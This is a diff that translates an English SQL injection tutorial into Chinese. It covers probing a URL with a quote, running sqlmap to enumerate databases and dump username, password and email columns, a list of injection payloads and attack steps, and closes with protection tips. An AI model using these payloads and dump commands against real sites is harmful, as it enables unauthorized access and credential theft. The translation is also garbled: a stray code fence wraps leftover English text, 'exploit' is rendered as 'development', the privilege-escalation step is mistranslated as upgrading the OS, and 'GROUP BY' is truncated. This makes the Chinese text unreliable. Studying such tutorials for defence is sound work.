@@ -86,7 +86,7 @@ QueryHere = "select * from information where code='$id'"
 
 
 #### 检查漏洞
-我们可以通过在URL的结尾附加一个简单的 ```'``` 来验证目标是否脆弱。
+我们可以通过在URL的结尾附加一个简单的单引号 ```'``` 来验证目标是否脆弱。
 
 ```
 http://www.website.com/info.php?id=10'
@@ -101,11 +101,13 @@ http://www.website.com/info.php?id=10'
 #### 找到数据库的结构
 要找到数据库中列和表的数量，我们可以使用 [Python's SQLmap](http://sqlmap.org/).
 
-This application streamlines the SQL injection process by automating the detection and exploitation of SQL injection flaws of a database. There are several automated mechanisms to find the database name, table names, and number of columns.
+该应用程序通过自动化数据库的SQL注入缺陷的检测和开发，从而简化了SQL注入过程。这里是几种自动机制来查找数据库名、表名和列数。
 
-* ORDER BY: it tries to order all columns form x to infinity. The iteration stops when the response shows that the input column x does not exist, reveling the value of x.
+* ORDER BY:它试图将所有的列从x到无穷排序。当响应显示输入列x不存在时，迭代就停止了，这将会显示x的值。
 
-* UNION: it gathers several data located in different table columns. The automated process tries to gather all information contained in columns/table x,y,z obtained by ORDER BY. The payload is similar to:
+* UNION:它在不同的表列中收集多个数据。这个自动化的过程试图收集由 ORDER BY 所获得的列/表x、y、z所包含的所有信息。有效负载类似于:
+
+```The automated process tries to gather all information contained in columns/table x,y,z obtained by ORDER BY. The payload is similar to:
 
 ```
 ?id=5'%22union%22all%22select%221,2,3
@@ -134,34 +136,34 @@ $ ./sqlmap.py -u <WEBSITE> --dbs
 (...)
 ```
 
-#### Gaining access to the Database
+#### 获得数据库的访问权限
 
-* From this we can verify what databases we have available, for example. From this we can find out how many tables exist, and their respective names. The sqlmap command is:
+* 例如，通过这种方式，我们可以验证我们现有的数据库是什么。通过这种方式，我们可以知道出现了多少个表，以及它们各自的名称。sqlmap命令是:
 
 ```
 ./sqlmap -u <WEBSITE> --tables <DATABASE-NAME>
 ```
 
-* The main objective is to find  usernames and passwords in order to gain access/login to the site, for example in a table named *users*. The sqlmap command is
+* 主要的目标是找到用户名和密码，以便获得访问/登录站点的权限，例如在一个名为*用户*的表中。sqlmap命令
 
 ```
 ./sqlmap -u <WEBSITE> --columns -D <DATABASE-NAME> -T <TABLE-NAME>
 ```
 
-This will return information about the columns in the given table.
+这将返回给定表中的列的信息。
 
-* Now we can dump all the data of all columns using the flag ```-C``` for column names:
+* 现在，我们可以使用标记为```-C```的列名称来转储所有列的所有数据: 
 
 ```
 ./sqlmap -u <WEBSITE> --columns -D <DATABASE-NAME> -T <TABLE-NAME> -C 'id,name,password,login,email' --dump
 ```
 
-If the password are clear text (not hashed in md5, etc), we have access to the website.
+如果密码是明文(不是在md5中散列，等等)，我们就可以访问这个网站。
 
-## Basic SQL Injection Exploit Steps
+## 基本SQL注入开发步骤
 
-1. Fingerprint database server.
-2. Get an initial working exploit. Examples of payloads:
+1. 指纹数据库服务器。
+2. 获得初步的运行开发。有效负载的例子:
 	- '
 	- '--
 	- ')--
@@ -169,28 +171,25 @@ If the password are clear text (not hashed in md5, etc), we have access to the w
 	- or '1'='1'
 	- or '1'='1
 	- 1--
-3. Extract data through UNION statements:
-	- NULL: use as a column place holder helps with data type conversion errors
-	- GROUP BY - help determine number of columns
-4. Enumerate database schema.
-5. Dump application data.
-6. Escalate privilege and pwn the OS.
+3. 通过UNION语句提取数据:
+	- NULL: 用作列位置占位符有助于数据类型转换错误
+	- GROUP 帮助确定列数
+4. 列举数据库架构。
+5. 把应用程序数据倾卸。
+6. 升级特权，并将操作系统升级。
 
 
 
+## 一些保护建议
 
-
-
-## Some Protection Tips
-
-* Never connect to a database as a super user or as a root.
-* Sanitize any user input. PHP has several functions that validate functions such as:
+* 永远不要将数据库作为超级用户或根用户连接。
+* 净化任何用户输入。PHP有几个函数来验证函数，比如:
 	- is_numeric()
 	- ctype_digit()
 	- settype()
 	- addslahes()
 	- str_replace()
-* Add quotes ```"``` to all non-numeric input values that will be passed to the database by using escape chars functions:
+* 对所有非数值输入值，添加引号 ```"```这些输入值将通过使用转义chars函数传递给数据库:
 	- mysql_real_escape_string()
 	- sqlit_escape_string()
 
@@ -200,13 +199,13 @@ $name = mysql_real_escape_string($name);
 $SQL = "SELECT * FROM users WHERE username='$name'";
 ```
 
-* Always perform a parse of data that is received from the user (POST and FORM methods).
-	- The chars to be checked:```", ', whitespace, ;, =, <, >, !, --, #, //```.
-	- The reserved words: SELECT, INSERT, UPDATE, DELETE, JOIN, WHERE, LEFT, INNER, NOT, IN, LIKE, TRUNCATE, DROP, CREATE, ALTER, DELIMITER.
+* 始终执行从用户接收到的数据的解析(POST和FORM方法)。
+	- 需要被检查的字符串:```", ', whitespace, ;, =, <, >, !, --, #, //```.
+	- 保留的单词: SELECT, INSERT, UPDATE, DELETE, JOIN, WHERE, LEFT, INNER, NOT, IN, LIKE, TRUNCATE, DROP, CREATE, ALTER, DELIMITER.
 
-* Do not display explicit error messages that show the request or a part of the SQL request. They can help fingerprint the RDBMS(MSSQL, MySQL).
+* 不要显示展现请求或部分SQL请求的明确的错误信息。它们可以帮助识别RDBMS(MSSQL，MySQL)。
 
-* Erase user accounts that are not used (and default accounts).
+* 删除未使用的用户帐户(和默认帐户)。
 
-* Other tools: blacklists, AMNESIA, Java Static Tainting, Codeigniter.
+* 其他工具: blacklists, AMNESIA, Java Static Tainting, Codeigniter.
 
